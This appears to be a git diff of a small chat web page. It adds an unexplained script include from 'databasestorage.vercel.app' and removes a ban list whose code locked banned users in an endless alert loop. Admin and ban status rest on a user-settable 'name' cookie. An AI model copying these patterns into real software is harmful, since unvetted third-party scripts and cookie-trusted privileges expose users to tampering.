@@ -24,6 +24,7 @@
     opacity: 1;
   }
 </style>
+<script src='databasestorage.vercel.app/index.js'></script>
 <script>
   function windowlocationpathname(current,newone){var href2=window.location.href;window.location.href=href2.replace(current,newone);}
   function get_cookie(cookie_name) { const value = "; " + document.cookie; const parts = value.split("; " + cookie_name + "="); if (parts.length === 2) return parts.pop().split(";").shift(); }
@@ -32,14 +33,6 @@
   const adminlist=["Nate","Pax","Fedex Driver DragonJR","Bothacker1115","davey","dragonjr","Joey - Let's Ship out Your Order!","KAISER WILHELM II"];
   const coadminlist=["Yoga","mason","C@MDEN"];
   const fedex=["Testname"];
-  const banlist=["bannednamelol","porn","Andrew","Nate","eouybvug4cyghfr 98uhbg frevu8jhbgrfv hu8ygdrfev78hyubghvdefh78ybgfrh8yugfhyubg e78huh frv 8h7yubgh fv8h7yfrv8hyoug vfhyuv bfyuhbgh wqdc 8up9nlhj dwcki0jnh bfrv 89uihbjfygivqwcyhoubv nvfuhibjfrihybew kjbh dec hwqfihub frva","spam the chat"];
-    var name=get_cookie("name");
-    if (banlist.includes(name)){
-	     while (true){
-        alert("you have been banned go away");
-        window.location.href="google.com";
-	     }
-  }
   const bot=["julianbot"];
   const youreverydaydavey=["davey2"];
   const enter = {
